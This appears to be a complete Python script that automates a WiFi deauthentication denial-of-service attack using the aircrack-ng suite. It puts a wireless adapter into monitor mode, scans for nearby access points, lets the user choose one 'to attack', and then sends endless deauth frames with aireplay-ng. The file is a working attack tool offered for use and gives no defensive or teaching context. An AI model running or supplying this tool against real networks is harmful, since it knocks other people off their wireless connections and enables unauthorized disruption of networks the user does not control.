from asyncio.subprocess import DEVNULL
import subprocess, os, re, csv, time

def command(cmd):
    return cmd.split(' ')

def delete_csv():
    csv_files = list(filter(lambda x: '.csv' in x, os.listdir('.')))

    for file in csv_files:
        os.remove(file) 

def reset_nic(nic):
    if not nic:
        print("No wifi adapter to reset.")
        return

    delete_csv()

    print(f"\nAttack halted.\nResetting {nic} to managed mode...")
    subprocess.run(command(f"airmon-ng stop {nic}"), stdout=DEVNULL)
    print("Restarting NIC processes...")
    subprocess.run(command("sudo systemctl start wpa_supplicant NetworkManager"))

active_wireless_networks = []

def check_for_essid(essid, lst):

    if len(lst) == 0: return False 

    for item in lst:
        if essid in item["ESSID"]:
            return True

    return False 

run_as_root = 'SUDO_UID' in os.environ.keys()

if not run_as_root:
    print("[-] Error: You need to run as root.")
    exit()

nic_regex = re.compile("wlan[0-9]+")

scan_nic_command = subprocess.run(['ifconfig'], capture_output=True).stdout.decode()

scanned_nics = nic_regex.findall(scan_nic_command)

nics_found = len(scanned_nics) > 0

if not nics_found:
    print("[-] Error: No Wifi Adapters found.")
    exit()

print("The following WiFi adapters were found:")
for k, v in enumerate(scanned_nics):
    print(f"{k} - {v}")

# Choose the wifi adapter 
while True:
    if len(scanned_nics) == 1:
        nic_index = 0 
        break
    nic_index = input("Select any of the following NICs: ")
    try:
        if scanned_nics[int(nic_index)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

nic = scanned_nics[int(nic_index)]

print(f"Killing intrusive system processes...", end=" ")
subprocess.run(command("sudo airmon-ng check kill"), stdout=DEVNULL)
print("Done.")

print(f"Putting {nic} into monitored mode...", end=" ")
subprocess.run(command(f"sudo airmon-ng start {nic}"), stdout=DEVNULL)
nic += "mon"
print("Done.")

subprocess.Popen(command(f"sudo airodump-ng -w file --write-interval 1 --output-format csv {nic}"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)

        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', \
            'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']

        filenames = list(filter(lambda x: '.csv' in x, os.listdir('.')))

        if not filenames:
            continue
    
        with open(filenames[0]) as file:
            file.seek(0)

            csv_reader = csv.DictReader(file, fieldnames=fieldnames)
            for row in csv_reader:
                if row["BSSID"] == "BSSID":
                    pass
                elif row["BSSID"] == "Station MAC":
                    break

                elif not check_for_essid(row["ESSID"], active_wireless_networks):
                    active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)
except FileExistsError:
    print("[-] Error: CSV file not found.")
    reset_nic(nic)
except KeyboardInterrupt:
    delete_csv()
except Exception as e:
    print(f"[-] Error: {e}")
    reset_nic(nic)

#Choose Access Point
while True:
    choice = input("Please select one of the access points above: ")
    try:
        if active_wireless_networks[int(choice)]:
            AP = active_wireless_networks[int(choice)]
            break
    except KeyboardInterrupt:
        reset_nic(nic)
    except:
        print("[-] Error: Invalid choice. Please try again.")

ap_mac = AP["BSSID"]
ap_channel = AP["channel"].strip()

# Change to the channel we want to perform the DOS attack on. 
subprocess.run(command(f"airmon-ng start {nic} {ap_channel}"), stdout=DEVNULL)

try:
    subprocess.run(command(f"aireplay-ng --deauth 0 -a {ap_mac} {nic}"))
except KeyboardInterrupt:
    reset_nic(nic)
finally:
    print("Bye!")